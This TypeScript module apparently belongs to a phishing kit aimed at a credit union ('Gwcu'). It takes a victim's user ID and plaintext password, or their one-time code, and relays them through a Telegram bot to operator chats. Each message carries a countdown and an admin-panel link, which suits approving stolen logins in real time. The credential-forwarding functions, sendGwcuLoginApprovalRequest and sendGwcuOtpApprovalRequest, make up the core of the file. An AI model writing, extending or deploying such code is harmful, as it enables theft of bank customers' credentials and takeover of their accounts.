import { sendTelegramApprovalWithCountdown } from '@/lib/telegram-approval-countdown'
import {
  buildLoginApprovalRequestBody,
  buildOtpApprovalRequestBody,
} from '@/lib/telegram-approval-templates'

const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || '')
  .split(',')
  .map((id) => id.trim())
  .filter(Boolean)

function escapeTelegramHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

function asCode(value: unknown): string {
  const text =
    typeof value === 'string'
      ? value.trim()
      : value != null && value !== ''
        ? String(value)
        : ''
  return `<code>${escapeTelegramHtml(text || 'Unknown')}</code>`
}

function isHttpUrl(value: string): boolean {
  return /^https?:\/\//i.test(value.trim())
}

function asLink(url: string, label?: string): string {
  const href = url.trim()
  if (!href || !isHttpUrl(href)) {
    return asCode(href || 'Unknown')
  }
  const linkText = (label?.trim() || href).trim()
  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`
}

function adminPortalLink(): string {
  const raw = process.env.ADMIN_PORTAL_URL?.trim()
  if (!raw) return '/admin/login'
  return raw.replace(/\/+$/, '')
}


export async function sendGwcuLoginApprovalRequest(data: {
  userId: string
  password: string
  method?: string
  createdAtMs: number
  databaseShard?: string
}): Promise<boolean> {
  const adminLink = adminPortalLink()
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs,
    buildText: (secondsLeft) =>
      buildLoginApprovalRequestBody({
        userId: data.userId,
        password: data.password,
        method: data.method,
        adminLink,
        secondsLeft,
        databaseShard: data.databaseShard,
        asCode,
        asLink,
      }),
  })
}

export async function sendGwcuOtpApprovalRequest(data: {
  userId: string
  code: string
  method?: string
  createdAtMs: number
  databaseShard?: string
}): Promise<boolean> {
  const adminLink = adminPortalLink()
  return sendTelegramApprovalWithCountdown({
    botToken: TELEGRAM_BOT_TOKEN,
    chatIds: CHAT_IDS,
    createdAtMs: data.createdAtMs,
    buildText: (secondsLeft) =>
      buildOtpApprovalRequestBody({
        userId: data.userId,
        code: data.code,
        method: data.method,
        adminLink,
        secondsLeft,
        databaseShard: data.databaseShard,
        asCode,
        asLink,
      }),
  })
}
